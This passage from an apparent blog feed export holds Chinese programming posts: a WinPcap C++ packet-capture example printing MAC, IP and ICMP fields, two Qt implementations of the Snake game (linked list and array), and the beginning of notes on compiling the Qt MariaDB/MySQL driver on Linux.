//ICMP头信息struct ICMPHeader&#123; BYTE m_byType; //类型 BYTE m_byCode; //代码 USHORT m_usChecksum; //检验和 USHORT m_usID; //标识符 USHORT m_usSeq; //序号 ULONG m_ulTimeStamp; //时间戳（非标准ICMP头部）&#125;;int main()&#123; //适配器的详细信息 pcap_if_t *alldevs; pcap_if_t *d; char errorbuff[PCAP_ERRBUF_SIZE]; printf("Winpcap lib version:\n%s \n", pcap_lib_version()); if (pcap_findalldevs( &amp;alldevs, errorbuff) == PCAP_ERROR) &#123; printf("error.."); &#125; int index = 0; char Name[256] = &#123; 0 &#125;; //过滤时用的子网掩码 u_int ulNetMask; for (d=alldevs ;d!=NULL;d=d-&gt;next) &#123; if (index==1) &#123; for (pcap_addr_t *tmp = d-&gt;addresses, *t = NULL;tmp != t;tmp = tmp-&gt;next) &#123; //掩码 ulNetMask = ((sockaddr_in*)(tmp-&gt;netmask))-&gt;sin_addr.S_un.S_addr; printf("NetMask: %s\n", inet_ntoa(((sockaddr_in*)(tmp-&gt;netmask))-&gt;sin_addr)); printf("%d\n", ulNetMask); &#125; strcpy(Name, d-&gt;name); &#125; printf("description:%s\n", d-&gt;description); printf("name:%s\n", d-&gt;name); /* pcap_addr * next 指向下一个地址的指针 sockaddr * addr IP地址 sockaddr * netmask 子网掩码 sockaddr * broadaddr 广播地址 sockaddr * dstaddr 目的地址 */ //获取 ip 地址 for (pcap_addr_t *tmp = d-&gt;addresses, *t=NULL;tmp != t;tmp = tmp-&gt;next) &#123; if (tmp-&gt;addr-&gt;sa_family == AF_INET) &#123; if (tmp-&gt;addr) &#123; printf("address:%s\n", inet_ntoa(((sockaddr_in*)tmp-&gt;addr)-&gt;sin_addr)); &#125; &#125; &#125; printf("————————————————————\n"); index++; &#125; pcap_t *adHande = pcap_open(Name, 65536, PCAP_OPENFLAG_PROMISCUOUS,// 混杂模式 1000, NULL, errorbuff); if (adHande!=NULL) &#123; if (pcap_datalink(adHande)==DLT_IEEE802) &#123; printf("DLT_IEEE802\n"); &#125; if (pcap_datalink(adHande) == DLT_EN10MB) &#123; printf("DLT_EN10MB\n"); &#125; if (pcap_datalink(adHande) != DLT_EN10MB) &#123; pcap_freealldevs(alldevs); &#125; /* 不用关心掩码，在这个过滤器中，它不会被使用 */ ulNetMask = 0xffffffff; bpf_program bpf_pro = &#123; 0 &#125;; if (pcap_compile(adHande, &amp;bpf_pro, "tcp or ip or icmp or arp", 1, ulNetMask) &lt; 0) &#123; printf("-----------&gt;error:pcap_compile\n"); pcap_freealldevs(alldevs); return 0; &#125; //设置过滤条件 if (pcap_setfilter(adHande, &amp;bpf_pro) &lt; 0) &#123; printf("-----------&gt;error:pcap_setfilter\n"); pcap_freealldevs(alldevs); return 0; &#125; //开始处理函数 pcap_loop(adHande, 0, packet_handler, NULL); pcap_freealldevs(alldevs); //释放一个过滤器 pcap_freecode(&amp;bpf_pro);。 pcap_close(adHande); &#125; return 0;&#125; //开始处理获取的数据包void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)&#123; //打印MAC地址 int j; EthernetHeader *ethernet = (EthernetHeader*)pkt_data; printf("Source MAC:"); for (j=0;j&lt;6;j++) &#123; if (j==5) printf("%2x", ethernet-&gt;bySrcMac[j]); else printf("%2x:", ethernet-&gt;bySrcMac[j]); &#125; printf("\t"); printf("Dest MAC:"); for (j = 0;j &lt; 6;j++) &#123; if (j == 5) printf("%2x", ethernet-&gt;byDestMac[j]); else printf("%2x:", ethernet-&gt;byDestMac[j]); &#125; printf("\n"); // 从 IP层开始读取数据！！偏移 14字节 //14为以太网帧头部长度 //获取原始的IP层协议 IPHeader2* iphdr = (IPHeader2*)(pkt_data + sizeof(EthernetHeader)); IPHeader* iphdr0 = (IPHeader*)(pkt_data + sizeof(EthernetHeader)); printf("%d.%d.%d.%d\t%d.%d.%d.%d\n", iphdr-&gt;m_ulSrcIP.byte1, iphdr-&gt;m_ulSrcIP.byte2, iphdr-&gt;m_ulSrcIP.byte3, iphdr-&gt;m_ulSrcIP.byte4, iphdr-&gt;m_ulDestIP.byte1, iphdr-&gt;m_ulDestIP.byte2, iphdr-&gt;m_ulDestIP.byte3, iphdr-&gt;m_ulDestIP.byte4 ); printf("%d.%05d\tlen:%d\n",header-&gt;ts.tv_sec, header-&gt;ts.tv_usec, header-&gt;len); //icmp if (iphdr-&gt;m_byProtocol==IPPROTO_ICMP) &#123; ICMPHeader*icmphdr = (ICMPHeader*)(pkt_data + 14 + sizeof(IPHeader)); printf("Type:%d\t%d\n", icmphdr-&gt;m_byType, icmphdr-&gt;m_ulTimeStamp); char data[100] = &#123; 0 &#125;; memcpy(data, ((char*)icmphdr) + sizeof(ICMPHeader), 50); data[strlen(data) - 1] = '\0'; printf("Data:%s\n", data); &#125;&#125;]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qt实现贪吃蛇2:链表实现]]></title>
    <url>%2Fcpp-snake2%2F</url>
    <content type="text"><![CDATA[前言前面已经介绍了用数组实现贪吃蛇，有了前面的基础知识，所以我就开门见山了。 正文此文是在前面的数组实现基础上加以改进的，所以说大部分还是很相似的。不过链表还是和数组有一定的区别的，所以在看此文之前，要有一些关于c链表的的知识…而且对于新手来讲还是有一定难度的。。。那么开始吧 首先，我先创建一个链表类（为什么我不能Qt自带的 QLinkedList ，因为用不习惯：( linkedlist.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#ifndef LINKEDLIST_H#define LINKEDLIST_H#include#include#includeclass Linkedlist:QObject&#123;public: //蛇节点 struct SnakeNode&#123; QPoint pos; SnakeNode* next; SnakeNode* prev; &#125;; Linkedlist(QObject *parent=0,QPoint headPos=QPoint()): QObject(parent),m_length(0)&#123; //初始化链表头，即蛇头 m_head=new SnakeNode; m_head-&gt;pos=headPos; m_head-&gt;next=NULL; m_head-&gt;prev=NULL; &#125; ~Linkedlist()&#123; clearAllNodes(); &#125; //返回头节点 inline SnakeNode *first()const&#123;if(m_head)&#123;return m_head;&#125;else return NULL;&#125; //返回尾节点 inline SnakeNode *last()const&#123; if(m_head)&#123; SnakeNode *p1=m_head; SnakeNode *p2; do &#123; p2=p1; p1=p1-&gt;next; &#125; while (p1); return p2; &#125;else&#123; return NULL; &#125; &#125; //返回节点总数 inline int getLength()&#123; m_length=0; if(m_head)&#123; SnakeNode *p=m_head; do &#123; m_length+=1; p=p-&gt;next; &#125; while (p!=NULL); &#125; return m_length; &#125; //打印所以节点 void printLinkedlist()&#123; if(m_head )&#123; SnakeNode *p=m_head; do &#123; qDebug()&lt;pos; p=p-&gt;next; &#125; while (p); qDebug()&lt;last())&#123; SnakeNode *ls=this-&gt;last(); if(ls)&#123; SnakeNode *p2=new SnakeNode; p2-&gt;prev=ls; p2-&gt;next=NULL; p2-&gt;pos=pos; ls-&gt;next=p2; &#125; &#125; &#125; //释放所有节点 inline void clearAllNodes()&#123; if(m_head)&#123; SnakeNode *p=m_head; do &#123; SnakeNode*t=p; m_head=p-&gt;next; delete t; t=NULL; p=m_head; &#125; while (p); &#125; &#125;private: int m_length; SnakeNode *m_head;&#125;;#endif // LINKEDLIST_H 这里就不多说了。。。不过要注意这里的 123456//蛇节点struct SnakeNode&#123; QPoint pos; SnakeNode* next; SnakeNode* prev;&#125;; 原本是没有 SnakeNode* prev; 的，后来在写代码时遇到点棘手的问题，所以就该了一下，变成双向链表。不过这里没有太在意这些，而且关于链表的操作也很少 widget.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#ifndef WIDGET_H#define WIDGET_H#include &lt;QWidget&gt;#include&lt;QLinkedList&gt;#include&lt;QTimer&gt;#include&lt;QKeyEvent&gt;#include"linkedlist.h"namespace Ui &#123;class Widget;&#125;class QLineEdit;class Widget : public QWidget&#123; Q_OBJECTprotected: void keyPressEvent(QKeyEvent *event); void paintEvent(QPaintEvent *event);public: //蛇头移动方向 enum SnakeDirection:int&#123; Up, Down, Left, Right &#125;; explicit Widget(QWidget *parent = 0); ~Widget(); void initializedGUI(); void resetFoodPos(); void checkisEatSelf(); void checkisEatFood(); void checkisHitWall(); void checkFoodPosisEqualHeadPos(); void snakeRunning();public slots: void timeOut(); void startGame(); void stopGame();private: Linkedlist *linkedlist; //蛇链表 int m_eatfoodCount; //吃到食物总数 QPoint m_foodPos;//食物坐标 int m_direction;//蛇头方向 int m_speed;//蛇移动速度 int m_score ;//得分 QPoint m_tmpPosPrev; QTimer *m_timerControl; QLineEdit *leScore; Ui::Widget *ui;&#125;;#endif // WIDGET_H widget.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310#include "widget.h"#include "ui_widget.h"#include&lt;QVBoxLayout&gt;#include&lt;QPushButton&gt;#include&lt;QLabel&gt;#include&lt;QLineEdit&gt;#include&lt;QPainter&gt;#include&lt;QTime&gt;#include&lt;QDebug&gt;#include&lt;QMessageBox&gt;#define ROW 20 //行数#define COLUMN 20 //列数#define Direction 4 //方向(枚举值void Widget::keyPressEvent(QKeyEvent *event)&#123; if(event-&gt;key()=='W'&amp;&amp;m_direction!=Down)&#123; m_direction=Up; &#125; if(event-&gt;key()=='S'&amp;&amp;m_direction!=Up)&#123; m_direction=Down; &#125; if(event-&gt;key()=='A'&amp;&amp;m_direction!=Right)&#123; m_direction=Left; &#125; if(event-&gt;key()=='D'&amp;&amp;m_direction!=Left)&#123; m_direction=Right; &#125;&#125;void Widget::paintEvent(QPaintEvent *event)&#123; Q_UNUSED(event); QPen pen; pen.setColor(QColor(Qt::darkGray)); QFont font; font.setPointSize(6); QPainter p(this); p.drawPixmap(0,0,width(),height(),QPixmap(":/img/imgs/bg.jpg")); p.setPen(pen); p.setFont(font); //绘制游戏布局 for (int row = 0; row &lt; ROW; ++row) &#123; for (int column =0; column &lt; COLUMN; ++column) &#123; p.fillRect(row*20,column*20,20,20,QBrush(QColor(0,0,0,10))); p.drawRect(row*20,column*20,20,20); &#125; &#125; //绘制食物 p.fillRect(m_foodPos.x()*20,m_foodPos.y()*20,20,20, QBrush(QPixmap(":/img/imgs/apple.png").scaled(20,20))); //绘制蛇 if(linkedlist-&gt;first())&#123; Linkedlist:: SnakeNode *pt=linkedlist-&gt;first(); do&#123; if(linkedlist-&gt;first()==pt)&#123;//绘制蛇头 QPixmap pixmap; switch (m_direction) &#123; case Up: pixmap=QPixmap(":/img/imgs/up.png").scaled(20,20); break; case Down: pixmap=QPixmap(":/img/imgs/down.png").scaled(20,20); break; case Left: pixmap=QPixmap(":/img/imgs/left.png").scaled(20,20); break; case Right: pixmap=QPixmap(":/img/imgs/right.png").scaled(20,20); break; default: break; &#125; p.fillRect(pt-&gt;pos.x()*20, pt-&gt;pos.y()*20, 20,20, QBrush(pixmap)); &#125;else if(linkedlist-&gt;last()==pt)&#123; //绘制蛇尾 QPixmap pixmap; pixmap=QPixmap(":/img/imgs/tail.png").scaled(20,20); p.fillRect(pt-&gt;pos.x()*20, pt-&gt;pos.y()*20, 20,20, QBrush(pixmap)); &#125;else&#123;//绘制蛇的其他位置 QPixmap pixmap; pixmap=QPixmap(":/img/imgs/body.png").scaled(20,20); p.fillRect(pt-&gt;pos.x()*20, pt-&gt;pos.y()*20, 20,20, QBrush(pixmap)); &#125; //指向下一个蛇身节点 pt=pt-&gt;next; &#125;while(pt!=NULL); &#125;&#125;Widget::Widget(QWidget *parent) : QWidget(parent), ui(new Ui::Widget)&#123; ui-&gt;setupUi(this); this-&gt;setFixedSize(800,450); this-&gt;setWindowTitle("贪吃蛇"); initializedGUI();&#125;Widget::~Widget()&#123; delete ui;&#125;////// \brief Widget::initializedGUI/// 初始化void Widget::initializedGUI()&#123; m_score=0; QPushButton *btnStart=new QPushButton(this); QPushButton *btnStop=new QPushButton(this); QLabel *lbScore=new QLabel(this); leScore=new QLineEdit(this); btnStart-&gt;setText(QObject::tr("开始游戏")); btnStop-&gt;setText(QObject::tr("暂停游戏")); btnStart-&gt;setFlat(true); btnStop-&gt;setFlat(true); lbScore-&gt;setText(tr("得分:")); leScore-&gt;setText(QString::number(m_score)); leScore-&gt;setFocusPolicy(Qt::NoFocus); leScore-&gt;setEnabled(false); lbScore-&gt;move(500,50); leScore-&gt;move(560,50); btnStart-&gt;move(500,100); btnStop-&gt;move(500,150); connect(btnStart,SIGNAL(clicked(bool)),this,SLOT(startGame())); connect(btnStop,SIGNAL(clicked(bool)),this,SLOT(stopGame())); QTime t= QTime::currentTime(); int s= t.secsTo(QTime(0,0,0,0)); qsrand(s);//随机数 m_direction=qrand()%Direction; switch (m_direction) &#123; case Up:qDebug()&lt;&lt;"蛇头方向:上"; break; case Down:qDebug()&lt;&lt;"蛇头方向:下"; break; case Left:qDebug()&lt;&lt;"蛇头方向:左"; break; case Right:qDebug()&lt;&lt;"蛇头方向:右"; break; default: break; &#125; m_foodPos.setX(qrand()%COLUMN); m_foodPos.setY(qrand()%ROW); qDebug()&lt;&lt;"食物坐标:"&lt;&lt;m_foodPos; m_speed=150; m_timerControl=new QTimer(this); m_timerControl-&gt;setInterval(m_speed); connect(m_timerControl,SIGNAL(timeout()),this,SLOT(timeOut())); QPoint pos; pos.setX(qrand()%COLUMN); pos.setY(qrand()%ROW); //在Linkedlist构造时初始化蛇头坐标 linkedlist=new Linkedlist(this,pos);&#125;////// \brief Widget::resetFoodPos/// 重设食物坐标void Widget::resetFoodPos()&#123; m_foodPos.setX(qrand()%COLUMN); m_foodPos.setY(qrand()%ROW); checkFoodPosisEqualHeadPos();&#125;////// \brief Widget::checkisEatSelf/// 判断是否吃到自己void Widget::checkisEatSelf()&#123; if(linkedlist-&gt;first())&#123; Linkedlist::SnakeNode *p0=linkedlist-&gt;first()-&gt;next; if(p0)&#123; do &#123; //判断蛇头坐标是否等于蛇身某个节点坐标 if(linkedlist-&gt;first()-&gt;pos==p0-&gt;pos)&#123; qDebug()&lt;&lt;"吃到自己!游戏结束"; m_timerControl-&gt;stop(); QMessageBox::critical(this,"game over","game over"); this-&gt;close(); break; &#125; p0=p0-&gt;next; &#125; while (p0); &#125; &#125;&#125;////// \brief Widget::checkisEatFood/// 检测是否吃到食物void Widget::checkisEatFood()&#123; if(linkedlist-&gt;first()-&gt;pos.x()==m_foodPos.x()&amp;&amp; linkedlist-&gt;first()-&gt;pos.y()==m_foodPos.y())&#123; qDebug()&lt;&lt;"吃到食物！"; m_eatfoodCount++; m_score+=20; leScore-&gt;setText(QString::number(m_score)+" 分"); if(m_score&gt;=100)&#123; m_speed=80; m_timerControl-&gt;setInterval(m_speed); &#125; //随便设置的x y 坐标 QPoint pos=QPoint(); linkedlist-&gt;append(pos); //重新设置食物坐标 resetFoodPos(); &#125;&#125;////// \brief Widget::checkisHitWall/// 检测是否撞到墙void Widget::checkisHitWall()&#123; if(linkedlist-&gt;first()-&gt;pos.x()&lt;0||linkedlist-&gt;first()-&gt;pos.y()&lt;0|| linkedlist-&gt;first()-&gt;pos.x()&gt;COLUMN-1||linkedlist-&gt;first()-&gt;pos.y()&gt;ROW-1)&#123; m_timerControl-&gt;stop(); qDebug()&lt;&lt;"撞到墙壁！游戏结束！"; QMessageBox::critical(this,"game over","game over!"); this-&gt;close(); &#125;&#125;void Widget::timeOut()&#123; checkisEatFood(); //打印出蛇身节点坐标 linkedlist-&gt;printLinkedlist(); //蛇身移动 if(linkedlist-&gt;first())&#123; Linkedlist::SnakeNode *p0=linkedlist-&gt;last(); if(linkedlist-&gt;getLength()!=1&amp;&amp;p0)&#123; do &#123; //把前一个节点的坐标赋值给当前节点 ，即蛇向前移动一格 p0-&gt;pos=p0-&gt;prev-&gt;pos; //指向前一个节点 p0=p0-&gt;prev; //因为 头结点的前一个节点为NULL //所以这里必须 p0!= linkedlist-&gt;first() &#125; while (p0!=linkedlist-&gt;first()); &#125; &#125; //蛇运动 snakeRunning(); checkisHitWall(); checkisEatSelf(); //更新绘图 this-&gt;update();&#125;////// \brief Widget::startGame/// 开始游戏void Widget::startGame()&#123; m_timerControl-&gt;start();&#125;////// \brief Widget::stopGame/// 结束游戏void Widget::stopGame()&#123; m_timerControl-&gt;stop();&#125;////// \brief Widget::snakeRunning/// 蛇运动void Widget::snakeRunning()&#123; int x=linkedlist-&gt;first()-&gt;pos.x(); int y=linkedlist-&gt;first()-&gt;pos.y(); //判断方向 switch (m_direction) &#123; case Up: linkedlist-&gt;first()-&gt;pos.setY(y-=1); break; case Down: linkedlist-&gt;first()-&gt;pos.setY(y+=1); break; case Left: linkedlist-&gt;first()-&gt;pos.setX(x-=1); break; case Right: linkedlist-&gt;first()-&gt;pos.setX(x+=1); break; default: break; &#125;&#125;////// \brief Widget::checkFoodPosisEqualHeadPos/// \param head/// \param foodPos/// 检测食物出现坐标是否在蛇身上void Widget::checkFoodPosisEqualHeadPos()&#123; if(linkedlist-&gt;first())&#123; Linkedlist::SnakeNode *p0=linkedlist-&gt;first(); do &#123; if(p0-&gt;pos==m_foodPos)&#123; qDebug()&lt;&lt;"检测到食物处于蛇身上..."; resetFoodPos(); &#125; p0=p0-&gt;next; &#125; while (p0); &#125;&#125; 测试 Bye~]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qt实现贪吃蛇1:数组实现]]></title>
    <url>%2Fcpp-snake1%2F</url>
    <content type="text"><![CDATA[前言最近刚学了链表这一方面的内容，感觉挺强大的，正巧想起以前用数组写过一个贪吃蛇游戏代码，于是打算用两种方法实现它。方法为以下两种： 数组 链表 正文其实，用数组实现贪吃蛇还算是比较简单的了，为什么？因为不用花太大功夫去考虑蛇身的每个节点之间的关系。同样，在实现蛇的游动、吃食、撞墙、吃到自己等功能时，最核心的部分我觉得是要弄清。 其中 void paintEvent(QPaintEvent *event) 用来在每次重绘时绘制游戏布局、食物的位置、蛇的位置。分别用两个数组表示 食物的位置、蛇的位置 12int food[2];// food[0]表示 x坐标，food[1]表示 y坐标 int snake[100][2]; //同理，不过这里100相当于最多有100个蛇节点 接着，void keyPressEvent(QKeyEvent * event) 事件用来改变蛇运动的方向。我添加了一个枚举值 1234567enum Direction:int&#123; East, South, West, North&#125;; 由于蛇是自己移动的，所以还是创建一个时钟 QTimer 对象。 那么怎么判断蛇是否吃到食物呢，这里其实很简单，可以判断蛇头的x,y坐标是否与食物的x,y坐标相等即可，即if(snake[0][0]==food[0]&amp;&amp;snake[0][1]==food[1]){...} 所以，检测是否撞到墙，也可以这样判断蛇头是否超过了边界 if((snake[0][0]&lt;0||snake[0][1]&lt;0||snake[0][0]&gt;Columns-1||snake[0][1]&gt;Rows-1)){ ... } 检测蛇是否吃到自己，可以 遍历每个蛇节点，判断蛇头 snake[0] 是否等于 某一个蛇身节点 snake[n] 即：蛇头在蛇的身上，表示吃到自己 好了，有了这些思路，那么就可以开始写代码了，可以创建一个Qt widget项目。代码如下： dialog.h 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#ifndef DIALOG_H#define DIALOG_H#include &lt;QDialog&gt;#include&lt;QPalette&gt;#include&lt;QPushButton&gt;#include&lt;QLabel&gt;#include&lt;QPainter&gt;#include&lt;QDebug&gt;#include&lt;QKeyEvent&gt;#include&lt;QTimer&gt;#include&lt;QTime&gt;namespace Ui &#123;class Dialog;&#125;class Dialog : public QDialog&#123; Q_OBJECTpublic slots: void timeOut(); void btnStartslot(); void btnPauseslot();protected: void keyPressEvent(QKeyEvent *); void paintEvent(QPaintEvent *event);public: explicit Dialog(QWidget *parent = 0); ~Dialog(); void initialized(); void snakeRun(); void checkHItWall(); void checkEatSelf(); enum Direction:int&#123; East, South, West, North &#125;;private: int food[2];//食物坐标 int snake[100][2];//蛇坐标 int eatfoodCount;//吃到的食物总数 int directtion;//蛇头方向 int scores;//得分 int speed;//蛇移动速度 QLabel *lbScroe; QTimer *timer; Ui::Dialog *ui;&#125;;#endif // DIALOG_H dialog.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210#include "dialog.h"#include "ui_dialog.h"#include&lt;QMessageBox&gt;#define Columns 20 //20列#define Rows 20 //20行void Dialog::timeOut()&#123; snakeRun();&#125;void Dialog::btnStartslot()&#123; timer-&gt;start();&#125;void Dialog::btnPauseslot()&#123; timer-&gt;stop();&#125;void Dialog::keyPressEvent(QKeyEvent * event)&#123; if(event-&gt;key()=='A')&#123; if(directtion!=West)&#123; directtion=East; &#125; &#125; if(event-&gt;key()=='D')&#123; if(directtion!=East)&#123; directtion=West; &#125; &#125; if(event-&gt;key()=='W')&#123; if(directtion!=South)&#123; directtion=North; &#125; &#125; if(event-&gt;key()=='S')&#123; if(directtion!=North)&#123; directtion=South; &#125; &#125;&#125;////// \brief Dialog::paintEvent/// \param event/// 绘图事件主要负责 绘制 蛇void Dialog::paintEvent(QPaintEvent *event)&#123; QPainter painter(this); QPen pen; pen.setColor(QColor(Qt::darkGray)); painter.setPen(pen); //绘制游戏布局 for (int row = 0; row &lt; Rows; ++row) &#123; for (int column = 0; column &lt; Columns; ++column) &#123; painter.drawRect(row*20,column*20,20,20); &#125; &#125; //绘制食物 painter.fillRect(food[0]*20,food[1]*20,20,20,Qt::red); //绘制蛇头 painter.fillRect(snake[0][0]*20,snake[0][1]*20,20,20,Qt::green); //根据食物的多少来绘制蛇身大长度 for (int snakeBody = 1; snakeBody &lt;= eatfoodCount; snakeBody++) &#123; painter.fillRect(snake[snakeBody][0]*20,snake[snakeBody][1]*20,20,20,QColor(0,100,0)); &#125;&#125;Dialog::Dialog(QWidget *parent) : QDialog(parent), ui(new Ui::Dialog)&#123; ui-&gt;setupUi(this); //设置随机数 QTime t=QTime::currentTime(); int s= t.secsTo(QTime(0,0,0,0)); qsrand(s); //初始化 initialized(); QPushButton *btnStart=new QPushButton(this); btnStart-&gt;setFlat(true); btnStart-&gt;setText("start ..."); btnStart-&gt;setGeometry(500,100,250,50); QPushButton *btnPause=new QPushButton(this); btnPause-&gt;setFlat(true); btnPause-&gt;setText("pause ..."); btnPause-&gt;setGeometry(500,180,250,50); connect(btnStart,SIGNAL(clicked(bool)),this,SLOT(btnStartslot())); connect(btnPause,SIGNAL(clicked(bool)),this,SLOT(btnPauseslot())); QLabel *lbshowScroe=new QLabel(this); lbScroe=new QLabel(this); lbshowScroe-&gt;setText("得分："); lbScroe-&gt;setText(QString::number(scores)); lbshowScroe-&gt;setGeometry(500,50,100,50); lbScroe-&gt;setGeometry(600,50,100,50); this-&gt;setFixedSize(800,460); this-&gt;setWindowTitle("贪吃蛇"); //设置时钟 timer=new QTimer(this); timer-&gt;setInterval(speed); connect(timer,SIGNAL(timeout()),this,SLOT(timeOut()));&#125;Dialog::~Dialog()&#123; delete ui;&#125;void Dialog::initialized()&#123; eatfoodCount=0; scores=0; speed=200; //初始化食物坐标 food[0]=qrand()%Columns; food [1]= qrand()%Rows; //初始化蛇头坐标 snake[0][0]=qrand()%Columns; snake[0][1]=qrand()%Rows; for (int i = 0; i &lt; eatfoodCount; ++i) &#123; //判断食物是否出现在蛇的身上 if(food[0]==snake[i][0]&amp;&amp;food[1]==snake[i][1])&#123; qDebug()&lt;&lt;"the food position is at snake ..."; snake[0][0]=qrand()%Columns; snake[0][1]=qrand()%Rows; &#125; &#125; //初始化蛇头方向 directtion=qrand()%4;&#125;////// \brief Dialog::snakeRun/// 蛇移动void Dialog::snakeRun()&#123; //打印出蛇的每个节点坐标，用于测试 for (int i = 0; i &lt; eatfoodCount; ++i) &#123; qDebug()&lt;&lt;QString("%1 : (%2-%3)").arg(i).arg(snake[i][0]).arg(snake[i][1]); &#125; qDebug()&lt;&lt;endl; //吃到食物，即 食物 food x,y坐标 等于 蛇头snake[0] x，y坐标 if(snake[0][0]==food[0]&amp;&amp;snake[0][1]==food[1])&#123; scores+=20; //得分 qDebug()&lt;&lt;"eat the food"; eatfoodCount++;//食物个数++ lbScroe-&gt;setText(QString::number(scores)); //产生新的食物位置 food[0]=qrand()%Columns; food [1]= qrand()%Rows; &#125; //变换速度 if(scores&gt;= 50)&#123; speed=100; timer-&gt;setInterval(speed); &#125;else if(scores&gt;=100)&#123; speed=50; timer-&gt;setInterval(speed); &#125; checkHItWall(); checkEatSelf(); //蛇头向前移动一格后，蛇头坐标变了， //原蛇头的坐标为第一节身体的坐标， //原第一节身体坐标为现在第二节的坐标，即所有坐标向前移动一格 for (int i = eatfoodCount; i &gt;0; i--) &#123; snake[i][0]=snake[i-1][0]; snake[i][1]=snake[i-1][1]; &#125; //根据方向来移动蛇 switch (directtion) &#123; case East: snake[0][0]--; break; case South: snake[0][1]++; break; case West: snake[0][0]++; break; case North: snake[0][1]--; break; default: break; &#125; /// 更新绘图 update();&#125;////// \brief Dialog::checkHItWall/// 是否撞墙void Dialog::checkHItWall()&#123; //即 判断是否超过了边界 if((snake[0][0]&lt;0||snake[0][1]&lt;0||snake[0][0]&gt;Columns-1||snake[0][1]&gt;Rows-1))&#123; qDebug()&lt;&lt;"Game Over"; timer-&gt;stop(); QMessageBox::information(this,"game over","hit the wall"); this-&gt;close(); &#125;&#125;////// \brief Dialog::checkEatSelf/// 是否吃到自己void Dialog::checkEatSelf()&#123; //遍历每个蛇节点，判断蛇头 snake[0] 是否等于 某一个蛇身节点 snake[n] for (int n = 1; n &lt;= eatfoodCount; n++) &#123; if(snake[0][0]==snake[n][0]&amp;&amp;snake[0][1]==snake[n][1])&#123; qDebug()&lt;&lt;"Game Over;;;"; timer-&gt;stop(); QMessageBox::information(this,"game over","eat self"); this-&gt;close(); &#125; &#125;&#125; 代码中的注释还算是比较详细的吧。。。不过关键还是自己亲手写出来！现在，来看一下运行结果 那么，下次在介绍用链表实现贪吃蛇！]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qt5.10.0编译MYSQL(Mariadb)驱动]]></title>
    <url>%2Flinux-qt-com-mysql%2F</url>
    <content type="text"><![CDATA[最近安装了新版本的Qt,当连接MySQL数据库时,又出现那个似曾相识的错误 QSqlDatabase: QMYSQL driver not loaded.知道后就赶紧去编译源码.然而你以为真的就那么一帆风顺吗? 问题测试环境: Linux Qt 5.10.0 MariaDB 10.1.29 出现问题:我是新换成了MariaDB,比起之前传统MySQL,相应的文件路径也发生了变化.而其结果时导致后面一连串的问题.现在网上大部分都是以前的MySQL驱动编译教程,关于MariaDB数据库(本质上也是MySQL)的资料很少,所以这里就总结一下期间遇到的问题…… 终端下输入: $ locate mysql.h在我这里输出 /usr/include/mariadb/mysql.h/usr/include/qt4/Qt/qsql_mysql.h/usr/include/qt4/QtSql/qsql_mysql.h 注意了没,就这里注定编译MySQL驱动会失败!因为默认的搜索路径为 /usr/include/mysql.h 接下来我们来看看 libqsqlmysql.so 这个库文件$ ldd libqsqlmysql.so 他说 libqsqlmysql.so.18 这个库文件没有找到,那么就只能重新编译了… 尝试成功但是这里我还是讲一下我第一次尝试的方法(就是把 mariadb 的库链接到 libqsqlmysql.so.18) $ locate libmariadb|grep so 查看 mariadb库文件的路径 /usr/lib/x86_64-linux-gnu/libmariadb.so/usr/lib/x86_64-linux-gnu/libmariadb.so.2/usr/lib/x86_64-linux-gnu/libmariadbclient.so.18/usr/lib/x86_64-linux-gnu/libmariadbclient.so.18.0.0 接着我再找下是否还存在之前的 libmysqlclient.so$ locate libmysqlclient.so /usr/lib/libmysqlclient.so $ ls -l /usr/lib/libmysqlclient.so 发现 libmysqlclient.so 是个软链接 lrwxrwxrwx 1 root root 43 9月 17 08:01 /usr/lib/libmysqlclient.so -&gt; /usr/lib/x86_64-linux-gnu/libmysqlclient.so 接着 $ ls -l /usr/lib/x86_64-linux-gnu/libmysqlclient.so ls: 无法访问’/usr/lib/x86_64-linux-gnu/libmysqlclient.so’: 没有那个文件或目录 what!居然不存在!?所以赶紧把那链接删了 那么接下来就是给 libmariadbclient.so 设个软链接 ln -s /usr/lib/x86_64-linux-gnu/libmariadbclient.so.18 /usr/lib/libmysqlclient.soln -s /usr/lib/x86_64-linux-gnu/libmariadbclient.so.18 /usr/lib/libmysqlclient.so.18 最后看看 $ ldd libqsqlmysql.so libmysqlclient.so.18 =&gt; /usr/lib/libmysqlclient.so.18 (0x00007fdf1a1df000) ……居然成功了!!那还用编译个毛啊??然而这不是本文重点蛤…… 重点(编译MySQL驱动)这里所说的驱动其实也不过就是一个链接库罢了…… 首先进入该源代码目录下 $ cd ${QTDIR}/5.10.0/Src/qtbase/src/plugins/sqldrivers/mysql 一般正常来讲接下来就是 qmake mysql.pro,make不过这里会出现一个错误 这就要修改 mysql.pro 12345678TARGET = qsqlmysqlHEADERS += $$PWD/qsql_mysql_p.hSOURCES += $$PWD/qsql_mysql.cpp $$PWD/main.cppQMAKE_USE += mysqlOTHER_FILES += 